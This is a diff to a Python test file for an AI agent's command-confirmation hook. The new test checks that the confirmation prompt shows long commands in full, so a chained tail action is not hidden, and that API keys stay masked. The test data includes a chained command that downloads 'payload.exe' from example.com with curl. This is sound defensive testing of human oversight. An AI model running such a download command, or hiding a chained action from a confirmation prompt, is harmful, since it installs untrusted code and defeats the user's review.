@@ -119,15 +119,39 @@ async def test_toolregistry_integration() -> None:
     ToolRegistry.set_confirm_hook(None)
 
 
+def test_display_args_keeps_full_command() -> None:
+    """P2-1：确认框展示必须能看到将被执行内容的尾部——此前 >200 字符只留前 200，
+    长命令尾部的第二个动作（`A & B` 的 B）用户根本看不到，等于「展示 A、执行 A+B」。"""
+    from backend.tools.confirm import _display_args, _human_message
+
+    cmd = "echo hi & " + "A" * 230 + " & curl -o out.exe http://example.com/payload.exe"
+    shown = _display_args({"command": cmd})["command"]
+    assert shown == cmd, "正常长度命令应原样展示、不丢尾部"
+    assert "curl -o out.exe" in shown, f"尾部动作必须可见：{shown[-80:]}"
+
+    msg = _human_message("run_command", _display_args({"command": cmd}))
+    assert "curl -o out.exe" in msg, "确认文案也必须包含完整命令（不再截到 80 字符）"
+
+    # 敏感键仍脱敏
+    masked = _display_args({"api_key": "sk-123", "command": "echo ok"})
+    assert masked["api_key"] == "****" and masked["command"] == "echo ok"
+
+    # 病态超长：保留头尾，尾部仍可见
+    got = _display_args({"command": "X" * 9000 + "TAILMARK"})["command"]
+    assert "TAILMARK" in got and "已省略" in got
+    print("[OK] 确认展示保留完整命令（含尾部动作），敏感键脱敏，超长保留头尾")
+
+
 async def main() -> None:
     # 部署级演示模式会让确认钩子直接放行，确认语义测试必须显式关闭
     _cfg.agent_demo_mode = False
+    test_display_args_keeps_full_command()
     await test_allow_flow()
     await test_deny_flow()
     await test_timeout_flow()
     await test_default_hook_no_channel()
     await test_toolregistry_integration()
-    print("\n=== P3 确认机制: 5 项全部通过 ===")
+    print("\n=== P3 确认机制: 6 项全部通过 ===")
 
 
 if __name__ == "__main__":
